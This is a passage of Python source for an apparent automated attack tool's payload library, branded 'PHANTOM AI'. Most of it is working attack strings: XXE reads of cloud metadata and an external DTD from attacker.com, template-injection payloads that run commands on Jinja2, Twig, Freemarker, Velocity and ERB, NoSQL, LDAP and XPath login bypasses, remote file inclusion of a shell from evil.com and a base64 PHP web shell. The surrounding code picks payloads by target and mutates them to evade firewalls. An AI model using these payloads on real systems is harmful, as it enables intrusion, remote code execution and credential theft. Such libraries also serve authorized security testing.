                raw='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                category=PayloadCategory.XXE,
                description="AWS metadata via XXE",
                waf_bypasses=[],
                severity="critical",
                tags={"ssrf", "aws"}
            ),

            # PHP filter
            Payload(
                raw='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
                category=PayloadCategory.XXE,
                description="PHP filter via XXE",
                waf_bypasses=[],
                severity="critical",
                tags={"php", "source-code"}
            ),

            # Parameter entities (blind)
            Payload(
                raw='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
                category=PayloadCategory.XXE,
                description="External DTD (blind)",
                waf_bypasses=[],
                severity="critical",
                tags={"blind", "oob"}
            ),

            # XInclude
            Payload(
                raw='<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
                category=PayloadCategory.XXE,
                description="XInclude attack",
                waf_bypasses=[],
                success_indicators=["root:", "bin:"],
                severity="critical",
                tags={"xinclude", "unix"}
            ),
        ]

    # =====================
    # SSTI Payloads
    # =====================
    def _load_ssti_payloads(self) -> List[Payload]:
        return [
            # Jinja2/Flask
            Payload(
                raw="{{7*7}}",
                category=PayloadCategory.SSTI,
                description="Basic math check",
                waf_bypasses=[],
                success_indicators=["49"],
                severity="high",
                tags={"detection", "jinja2"}
            ),
            Payload(
                raw="{{config}}",
                category=PayloadCategory.SSTI,
                description="Jinja2 config leak",
                waf_bypasses=[],
                success_indicators=["SECRET_KEY", "DEBUG"],
                severity="critical",
                tags={"jinja2", "flask"}
            ),
            Payload(
                raw="{{''.__class__.__mro__[1].__subclasses__()}}",
                category=PayloadCategory.SSTI,
                description="Jinja2 class enumeration",
                waf_bypasses=[],
                severity="critical",
                tags={"jinja2", "rce"}
            ),
            Payload(
                raw="{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                category=PayloadCategory.SSTI,
                description="Jinja2 RCE",
                waf_bypasses=[],
                success_indicators=["uid=", "gid="],
                severity="critical",
                tags={"jinja2", "rce"}
            ),

            # Twig (PHP)
            Payload(
                raw="{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                category=PayloadCategory.SSTI,
                description="Twig RCE",
                waf_bypasses=[],
                success_indicators=["uid="],
                severity="critical",
                tags={"twig", "php", "rce"}
            ),

            # Freemarker (Java)
            Payload(
                raw="${7*7}",
                category=PayloadCategory.SSTI,
                description="Freemarker math check",
                waf_bypasses=[],
                success_indicators=["49"],
                severity="high",
                tags={"detection", "freemarker"}
            ),
            Payload(
                raw='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                category=PayloadCategory.SSTI,
                description="Freemarker RCE",
                waf_bypasses=[],
                success_indicators=["uid="],
                severity="critical",
                tags={"freemarker", "java", "rce"}
            ),

            # Velocity (Java)
            Payload(
                raw="#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()",
                category=PayloadCategory.SSTI,
                description="Velocity RCE",
                waf_bypasses=[],
                severity="critical",
                tags={"velocity", "java", "rce"}
            ),

            # ERB (Ruby)
            Payload(
                raw="<%= 7*7 %>",
                category=PayloadCategory.SSTI,
                description="ERB math check",
                waf_bypasses=[],
                success_indicators=["49"],
                severity="high",
                tags={"detection", "erb"}
            ),
            Payload(
                raw="<%= system('id') %>",
                category=PayloadCategory.SSTI,
                description="ERB RCE",
                waf_bypasses=[],
                success_indicators=["uid="],
                severity="critical",
                tags={"erb", "ruby", "rce"}
            ),
        ]

    # =====================
    # NoSQL Payloads
    # =====================
    def _load_nosql_payloads(self) -> List[Payload]:
        return [
            # MongoDB auth bypass
            Payload(
                raw='{"$gt": ""}',
                category=PayloadCategory.NOSQL,
                description="MongoDB greater than bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"mongodb", "auth-bypass"}
            ),
            Payload(
                raw='{"$ne": null}',
                category=PayloadCategory.NOSQL,
                description="MongoDB not equal bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"mongodb", "auth-bypass"}
            ),
            Payload(
                raw='{"$regex": ".*"}',
                category=PayloadCategory.NOSQL,
                description="MongoDB regex bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"mongodb", "auth-bypass"}
            ),

            # URL parameter format
            Payload(
                raw="username[$ne]=admin&password[$ne]=admin",
                category=PayloadCategory.NOSQL,
                description="URL param auth bypass",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="critical",
                tags={"mongodb", "auth-bypass", "url"}
            ),

            # JavaScript injection
            Payload(
                raw='";return true;//',
                category=PayloadCategory.NOSQL,
                description="JS injection bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"mongodb", "js-injection"}
            ),
            Payload(
                raw="' || '1'=='1",
                category=PayloadCategory.NOSQL,
                description="JS OR bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"mongodb", "js-injection"}
            ),
        ]

    # =====================
    # CRLF Payloads
    # =====================
    def _load_crlf_payloads(self) -> List[Payload]:
        return [
            Payload(
                raw="%0d%0aSet-Cookie: test=injected",
                category=PayloadCategory.CRLF,
                description="Cookie injection",
                waf_bypasses=[WAFBypassTechnique.DOUBLE_URL_ENCODE],
                success_indicators=["Set-Cookie: test=injected"],
                severity="high",
                tags={"cookie"}
            ),
            Payload(
                raw="%0d%0aX-Injected: true",
                category=PayloadCategory.CRLF,
                description="Header injection",
                waf_bypasses=[],
                success_indicators=["X-Injected: true"],
                severity="high",
                tags={"header"}
            ),
            Payload(
                raw="%0d%0a%0d%0a<script>alert(1)</script>",
                category=PayloadCategory.CRLF,
                description="HTTP response splitting XSS",
                waf_bypasses=[],
                severity="critical",
                tags={"xss", "response-split"}
            ),
            Payload(
                raw="\r\nLocation: https://evil.com",
                category=PayloadCategory.CRLF,
                description="Redirect injection",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"redirect"}
            ),
        ]

    # =====================
    # Open Redirect Payloads
    # =====================
    def _load_redirect_payloads(self) -> List[Payload]:
        return [
            Payload(
                raw="https://evil.com",
                category=PayloadCategory.OPEN_REDIRECT,
                description="Direct external URL",
                waf_bypasses=[],
                severity="medium",
                tags={"basic"}
            ),
            Payload(
                raw="//evil.com",
                category=PayloadCategory.OPEN_REDIRECT,
                description="Protocol-relative URL",
                waf_bypasses=[],
                severity="medium",
                tags={"basic"}
            ),
            Payload(
                raw="/\\evil.com",
                category=PayloadCategory.OPEN_REDIRECT,
                description="Backslash bypass",
                waf_bypasses=[],
                severity="medium",
                tags={"bypass"}
            ),
            Payload(
                raw="https://trusted.com@evil.com",
                category=PayloadCategory.OPEN_REDIRECT,
                description="URL credential bypass",
                waf_bypasses=[],
                severity="medium",
                tags={"bypass"}
            ),
            Payload(
                raw="https://evil.com#trusted.com",
                category=PayloadCategory.OPEN_REDIRECT,
                description="Fragment bypass",
                waf_bypasses=[],
                severity="medium",
                tags={"bypass"}
            ),
            Payload(
                raw="https://evil.com?trusted.com",
                category=PayloadCategory.OPEN_REDIRECT,
                description="Query bypass",
                waf_bypasses=[],
                severity="medium",
                tags={"bypass"}
            ),
            Payload(
                raw="//evil.com/%2f..",
                category=PayloadCategory.OPEN_REDIRECT,
                description="Path confusion",
                waf_bypasses=[],
                severity="medium",
                tags={"bypass"}
            ),
            Payload(
                raw="javascript:alert(document.domain)",
                category=PayloadCategory.OPEN_REDIRECT,
                description="JavaScript protocol",
                waf_bypasses=[WAFBypassTechnique.CASE_VARIATION],
                severity="high",
                tags={"xss", "protocol"}
            ),
        ]


# =============================================================================
# PHANTOM AI ENHANCED PAYLOAD LIBRARY METHODS
# =============================================================================

class PayloadLibraryEnhanced(PayloadLibrary):
    """
    PHANTOM AI Enhanced Payload Library.

    Adds advanced features:
    - Context-aware payload selection
    - Custom payload management
    - Mutation chain generation
    - Technology-specific payloads
    - Statistical analysis
    """

    VERSION = "3.0.0"
    _enhanced_instance: Optional["PayloadLibraryEnhanced"] = None

    @classmethod
    def get_enhanced_instance(cls) -> "PayloadLibraryEnhanced":
        """Get singleton instance of enhanced library."""
        if cls._enhanced_instance is None:
            cls._enhanced_instance = cls()
        return cls._enhanced_instance

    def __init__(self) -> None:
        """Initialize enhanced payload library."""
        super().__init__()
        self._custom_payloads: Dict[PayloadCategory, List[Payload]] = {
            cat: [] for cat in PayloadCategory
        }
        self._effectiveness_data: Dict[str, Dict[str, float]] = {}
        self._load_extended_payloads()

    def _load_extended_payloads(self) -> None:
        """Load additional payload categories for PHANTOM AI."""
        # Add RFI payloads
        self._payloads[PayloadCategory.RFI] = self._load_rfi_payloads()
        # Add LDAP payloads
        self._payloads[PayloadCategory.LDAP] = self._load_ldap_payloads()
        # Add XPath payloads
        self._payloads[PayloadCategory.XPATH] = self._load_xpath_payloads()

    def _load_rfi_payloads(self) -> List[Payload]:
        """Load RFI (Remote File Inclusion) payloads."""
        return [
            Payload(
                raw="http://evil.com/shell.txt",
                category=PayloadCategory.RFI,
                description="Basic RFI",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="critical",
                tags={"basic"}
            ),
            Payload(
                raw="http://evil.com/shell.txt%00",
                category=PayloadCategory.RFI,
                description="Null byte RFI",
                waf_bypasses=[],
                severity="critical",
                tags={"null-byte"}
            ),
            Payload(
                raw="http://evil.com/shell.txt?",
                category=PayloadCategory.RFI,
                description="Query string bypass RFI",
                waf_bypasses=[],
                severity="critical",
                tags={"bypass"}
            ),
            Payload(
                raw="https://evil.com/shell.txt",
                category=PayloadCategory.RFI,
                description="HTTPS RFI",
                waf_bypasses=[],
                severity="critical",
                tags={"https"}
            ),
            Payload(
                raw="//evil.com/shell.txt",
                category=PayloadCategory.RFI,
                description="Protocol-relative RFI",
                waf_bypasses=[],
                severity="critical",
                tags={"bypass"}
            ),
            Payload(
                raw="data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                category=PayloadCategory.RFI,
                description="Data URI RFI (base64 PHP)",
                waf_bypasses=[],
                success_indicators=["<?php"],
                severity="critical",
                tags={"data-uri", "php"}
            ),
        ]

    def _load_ldap_payloads(self) -> List[Payload]:
        """Load LDAP injection payloads."""
        return [
            Payload(
                raw="*",
                category=PayloadCategory.LDAP,
                description="Wildcard",
                waf_bypasses=[],
                severity="medium",
                tags={"basic"}
            ),
            Payload(
                raw="*)(&",
                category=PayloadCategory.LDAP,
                description="AND bypass",
                waf_bypasses=[],
                severity="high",
                tags={"bypass"}
            ),
            Payload(
                raw="*)(objectClass=*",
                category=PayloadCategory.LDAP,
                description="ObjectClass enum",
                waf_bypasses=[],
                severity="high",
                tags={"enum"}
            ),
            Payload(
                raw="admin)(&)",
                category=PayloadCategory.LDAP,
                description="Admin bypass",
                waf_bypasses=[],
                severity="critical",
                tags={"auth-bypass"}
            ),
            Payload(
                raw="*))%00",
                category=PayloadCategory.LDAP,
                description="Null byte termination",
                waf_bypasses=[],
                severity="high",
                tags={"null-byte"}
            ),
            Payload(
                raw="admin)(|(password=*))",
                category=PayloadCategory.LDAP,
                description="Password extraction",
                waf_bypasses=[],
                severity="critical",
                tags={"exfil", "password"}
            ),
            Payload(
                raw="*)(uid=*))(|(uid=*",
                category=PayloadCategory.LDAP,
                description="UID enumeration",
                waf_bypasses=[],
                severity="high",
                tags={"enum", "uid"}
            ),
        ]

    def _load_xpath_payloads(self) -> List[Payload]:
        """Load XPath injection payloads."""
        return [
            Payload(
                raw="' or '1'='1",
                category=PayloadCategory.XPATH,
                description="Basic XPath bypass",
                waf_bypasses=[WAFBypassTechnique.URL_ENCODE],
                severity="high",
                tags={"boolean"}
            ),
            Payload(
                raw="' or ''='",
                category=PayloadCategory.XPATH,
                description="Empty string bypass",
                waf_bypasses=[],
                severity="high",
                tags={"boolean"}
            ),
            Payload(
                raw="'] | //*[password='",
                category=PayloadCategory.XPATH,
                description="Password extraction",
                waf_bypasses=[],
                severity="critical",
                tags={"exfil", "password"}
            ),
            Payload(
                raw="' or count(parent::*[position()=1])=0 or 'a'='b",
                category=PayloadCategory.XPATH,
                description="Position count bypass",
                waf_bypasses=[],
                severity="high",
                tags={"bypass"}
            ),
            Payload(
                raw="' or contains(name(parent::*),'a') or 'a'='b",
                category=PayloadCategory.XPATH,
                description="Contains function bypass",
                waf_bypasses=[],
                severity="high",
                tags={"bypass"}
            ),
            Payload(
                raw="']/password | //*['",
                category=PayloadCategory.XPATH,
                description="Node navigation",
                waf_bypasses=[],
                severity="critical",
                tags={"exfil"}
            ),
        ]

    def get_payloads_for_context(
        self,
        category: PayloadCategory,
        tech_stack: Optional[List[str]] = None,
        waf_detected: bool = False,
        reflection_context: Optional[str] = None,
        injection_point: Optional[str] = None,
        os_type: Optional[str] = None,
        max_payloads: int = 30,
    ) -> List[Payload]:
        """
        Get payloads optimized for the specific context.

        PHANTOM AI enhanced method for intelligent payload selection.

        Args:
            category: Payload category
            tech_stack: List of detected technologies
            waf_detected: Whether a WAF was detected
            reflection_context: For XSS - where value is reflected
            injection_point: Specific injection context
            os_type: Target OS (unix/windows)
            max_payloads: Maximum payloads to return

        Returns:
            List of Payload objects ranked by context relevance
        """
        base_payloads = self._payloads.get(category, [])
        custom_payloads = self._custom_payloads.get(category, [])
        all_payloads = base_payloads + custom_payloads

        scored_payloads: List[tuple] = []

        for payload in all_payloads:
            score = 1.0

            # Tech stack scoring
            if tech_stack and payload.tags:
                tech_lower = [t.lower() for t in tech_stack]
                for tag in payload.tags:
                    if any(tech in tag.lower() or tag.lower() in tech for tech in tech_lower):
                        score *= 1.5

            # WAF scoring - prefer payloads with bypass techniques
            if waf_detected:
                if payload.waf_bypasses:
                    score *= (1.0 + len(payload.waf_bypasses) * 0.2)
                else:
                    score *= 0.7  # Lower priority for payloads without bypasses

            # Context scoring for XSS
            if category == PayloadCategory.XSS and reflection_context:
                if payload.context and payload.context == reflection_context:
                    score *= 2.0
                elif payload.context and payload.context != reflection_context:
                    score *= 0.5

            # OS type scoring for CMDi/LFI
            if category in [PayloadCategory.CMDI, PayloadCategory.LFI] and os_type:
                os_lower = os_type.lower()
                if "unix" in payload.tags or "linux" in payload.tags:
                    if os_lower in ["unix", "linux"]:
                        score *= 1.5
                    else:
                        score *= 0.5
                elif "windows" in payload.tags:
                    if os_lower == "windows":
                        score *= 1.5
                    else:
                        score *= 0.5

            # Database type for SQLi
            if category == PayloadCategory.SQLI and tech_stack:
                db_types = ["mysql", "postgresql", "mssql", "oracle", "sqlite", "mariadb"]
                for tech in tech_stack:
                    if tech.lower() in db_types:
                        if payload.db_type == tech.lower():
                            score *= 2.0
                        elif payload.db_type and payload.db_type != tech.lower():
                            score *= 0.5

            # Severity scoring
            severity_multipliers = {
                "critical": 1.5,
                "high": 1.2,
                "medium": 1.0,
                "low": 0.8,
            }
            score *= severity_multipliers.get(payload.severity, 1.0)

            # Effectiveness data scoring
            payload_key = f"{category.name}:{payload.raw[:50]}"
            if payload_key in self._effectiveness_data:
                effectiveness = self._effectiveness_data[payload_key].get("rate", 0.5)
                score *= (0.5 + effectiveness)

            scored_payloads.append((score, payload))

        # Sort by score descending
        scored_payloads.sort(key=lambda x: x[0], reverse=True)

        # Return top payloads
        return [p for _, p in scored_payloads[:max_payloads]]

    def add_custom_payload(
        self,
        raw: str,
        category: PayloadCategory,
        description: str = "Custom payload",
        waf_bypasses: Optional[List[WAFBypassTechnique]] = None,
        db_type: Optional[str] = None,
        context: Optional[str] = None,
        success_indicators: Optional[List[str]] = None,
        severity: str = "medium",
        tags: Optional[Set[str]] = None,
    ) -> Payload:
        """
        Add a custom payload to the library.

        PHANTOM AI method for dynamic payload expansion.

        Args:
            raw: Raw payload string
            category: Payload category
            description: Payload description
            waf_bypasses: List of WAF bypass techniques
            db_type: Database type (for SQLi)
            context: Context (for XSS)
            success_indicators: Patterns indicating success
            severity: Severity level
            tags: Tags for categorization

        Returns:
            The created Payload object
        """
        payload = Payload(
            raw=raw,
            category=category,
            description=description,
            waf_bypasses=waf_bypasses or [],
            db_type=db_type,
            context=context,
            success_indicators=success_indicators or [],
            severity=severity,
            tags=tags or {"custom"},
        )

        self._custom_payloads[category].append(payload)

        return payload

    def get_mutation_chain(
        self,
        payload: str,
        mutations: int = 5,
        category: Optional[PayloadCategory] = None,
    ) -> List[tuple]:
        """
        Generate a chain of mutated payloads.

        PHANTOM AI method for creating bypass variants.

        Args:
            payload: Original payload
            mutations: Number of mutations to generate
            category: Payload category (for context-aware mutations)

        Returns:
            List of (mutated_payload, techniques_applied) tuples
        """
        chain: List[tuple] = [(payload, [])]

        # Order of mutation techniques
        mutation_order = [
            WAFBypassTechnique.URL_ENCODE,
            WAFBypassTechnique.CASE_VARIATION,
            WAFBypassTechnique.COMMENT_INSERTION,
            WAFBypassTechnique.WHITESPACE_VARIATION,
            WAFBypassTechnique.DOUBLE_URL_ENCODE,
            WAFBypassTechnique.HEX,
            WAFBypassTechnique.UNICODE,
            WAFBypassTechnique.HTML_ENTITY,
            WAFBypassTechnique.BASE64,
            WAFBypassTechnique.NULL_BYTE,
        ]

        # Adjust order based on category
        if category == PayloadCategory.SQLI:
            # SQL prefers comment insertion and case variation
            mutation_order = [
                WAFBypassTechnique.COMMENT_INSERTION,
                WAFBypassTechnique.CASE_VARIATION,
                WAFBypassTechnique.WHITESPACE_VARIATION,
                WAFBypassTechnique.URL_ENCODE,
                WAFBypassTechnique.DOUBLE_URL_ENCODE,
                WAFBypassTechnique.HEX,
                WAFBypassTechnique.UNICODE,
            ]
        elif category == PayloadCategory.XSS:
            # XSS prefers case variation and HTML entity
            mutation_order = [
                WAFBypassTechnique.CASE_VARIATION,
                WAFBypassTechnique.HTML_ENTITY,
                WAFBypassTechnique.UNICODE,
                WAFBypassTechnique.URL_ENCODE,
                WAFBypassTechnique.DOUBLE_URL_ENCODE,
            ]
        elif category == PayloadCategory.LFI:
            # LFI prefers URL encoding and null bytes
            mutation_order = [
                WAFBypassTechnique.URL_ENCODE,
                WAFBypassTechnique.DOUBLE_URL_ENCODE,
                WAFBypassTechnique.NULL_BYTE,
                WAFBypassTechnique.UNICODE,
            ]

        current_payload = payload
        applied_techniques: List[WAFBypassTechnique] = []

        for i, technique in enumerate(mutation_order[:mutations]):
            mutated = PayloadEncoder.apply_bypass(current_payload, technique)
            if mutated != current_payload:
                applied_techniques.append(technique)
                chain.append((mutated, list(applied_techniques)))
                current_payload = mutated

        # Also generate some standalone mutations from original
        for technique in mutation_order[mutations:mutations + 3]:
            mutated = PayloadEncoder.apply_bypass(payload, technique)
            if mutated != payload:
                chain.append((mutated, [technique]))

        return chain[:mutations + 3]

    def record_effectiveness(
        self,
        category: PayloadCategory,
        payload: str,
        success: bool,
    ) -> None:
        """
        Record payload effectiveness for learning.

        PHANTOM AI adaptive learning method.

        Args:
            category: Payload category
            payload: Payload that was tested
            success: Whether it was successful
        """
        key = f"{category.name}:{payload[:50]}"

        if key not in self._effectiveness_data:
            self._effectiveness_data[key] = {"attempts": 0, "successes": 0, "rate": 0.5}

        self._effectiveness_data[key]["attempts"] += 1
        if success:
            self._effectiveness_data[key]["successes"] += 1

        attempts = self._effectiveness_data[key]["attempts"]
        successes = self._effectiveness_data[key]["successes"]
        self._effectiveness_data[key]["rate"] = successes / attempts

    def get_statistics(self) -> Dict:
        """
        Get comprehensive statistics about the payload library.

        Returns:
            Dictionary with library statistics
        """
        stats = {
            "version": self.VERSION,
            "total_payloads": 0,
            "by_category": {},
            "custom_payloads": 0,
            "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 0},
            "with_waf_bypass": 0,
            "with_success_indicators": 0,
            "effectiveness_entries": len(self._effectiveness_data),
        }

        for category, payloads in self._payloads.items():
            count = len(payloads)
            stats["by_category"][category.name] = count
            stats["total_payloads"] += count

            for p in payloads:
                stats["by_severity"][p.severity] = stats["by_severity"].get(p.severity, 0) + 1
                if p.waf_bypasses:
                    stats["with_waf_bypass"] += 1
                if p.success_indicators:
                    stats["with_success_indicators"] += 1

        for category, payloads in self._custom_payloads.items():
            stats["custom_payloads"] += len(payloads)
            stats["by_category"][f"{category.name}_custom"] = len(payloads)

        return stats

    def export_payloads(
        self,
        category: Optional[PayloadCategory] = None,
        format_type: str = "list",
    ) -> str:
        """
        Export payloads to a string format.

        Args:
            category: Category to export (None for all)
            format_type: "list" (one per line) or "json"

        Returns:
            Formatted string with payloads
        """
        if category:
            payloads = self._payloads.get(category, []) + self._custom_payloads.get(category, [])
        else:
            payloads = []
            for cat_payloads in self._payloads.values():
                payloads.extend(cat_payloads)
            for cat_payloads in self._custom_payloads.values():
                payloads.extend(cat_payloads)

        if format_type == "json":
            import json
            export_data = []
            for p in payloads:
                export_data.append({
                    "payload": p.raw,
                    "category": p.category.name,
                    "description": p.description,
                    "severity": p.severity,
                    "db_type": p.db_type,
                    "context": p.context,
                    "tags": list(p.tags),
                })
            return json.dumps(export_data, indent=2)
        else:
            return "\n".join(p.raw for p in payloads)

    def get_polyglot_payloads(self) -> List[Payload]:
        """
        Get polyglot payloads that work across multiple contexts.

        Returns:
            List of polyglot payloads
        """
        polyglots = [
            # XSS/SQLi polyglot
            Payload(
                raw="'-alert(1)-'",
                category=PayloadCategory.XSS,
                description="XSS/SQLi polyglot",
                severity="high",
                tags={"polyglot", "xss", "sqli"}
            ),
            # SQL/XSS/Path polyglot
            Payload(
                raw="'\" onclick=alert(1)//",
                category=PayloadCategory.XSS,
                description="Quote escape polyglot",
                severity="high",
                tags={"polyglot", "xss", "sqli"}
            ),
            # JavaScript polyglot
            Payload(
                raw="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                category=PayloadCategory.XSS,
                description="Ultimate XSS polyglot",
                severity="critical",
                tags={"polyglot", "xss", "advanced"}
            ),
            # SQL polyglot (works on multiple DBs)
            Payload(
                raw="'/**/OR/**/1=1--/**/;",
                category=PayloadCategory.SQLI,
                description="Multi-DB SQLi polyglot",
                severity="high",
                tags={"polyglot", "sqli", "multi-db"}
            ),
            # CRLF/Header polyglot
            Payload(
                raw="%0d%0a%0d%0a<script>alert(1)</script>",
                category=PayloadCategory.CRLF,
                description="CRLF/XSS polyglot",
                severity="critical",
                tags={"polyglot", "crlf", "xss"}
            ),
        ]
        return polyglots


# Helper function to get enhanced library
def get_enhanced_library() -> PayloadLibraryEnhanced:
    """Get the enhanced payload library instance."""
    return PayloadLibraryEnhanced.get_enhanced_instance()


# Convenience functions for common use cases
def get_sqli_payloads(db_type: Optional[str] = None, max_payloads: int = 30) -> List[str]:
    """Get SQLi payloads, optionally filtered by database type."""
    return PayloadLibrary.get_instance().get_payloads(
        PayloadCategory.SQLI,
        db_type=db_type,
        max_payloads=max_payloads
    )


def get_xss_payloads(context: Optional[str] = None, max_payloads: int = 30) -> List[str]:
    """Get XSS payloads, optionally filtered by context."""
    return PayloadLibrary.get_instance().get_payloads(
        PayloadCategory.XSS,
        context=context,
        max_payloads=max_payloads
    )


def get_cmdi_payloads(max_payloads: int = 20) -> List[str]:
    """Get command injection payloads."""
    return PayloadLibrary.get_instance().get_payloads(
        PayloadCategory.CMDI,
        max_payloads=max_payloads
    )


def get_lfi_payloads(max_payloads: int = 20) -> List[str]:
    """Get LFI payloads."""
    return PayloadLibrary.get_instance().get_payloads(
        PayloadCategory.LFI,
        max_payloads=max_payloads
    )


def get_ssrf_payloads(max_payloads: int = 20) -> List[str]:
    """Get SSRF payloads."""
    return PayloadLibrary.get_instance().get_payloads(
        PayloadCategory.SSRF,
        max_payloads=max_payloads
    )
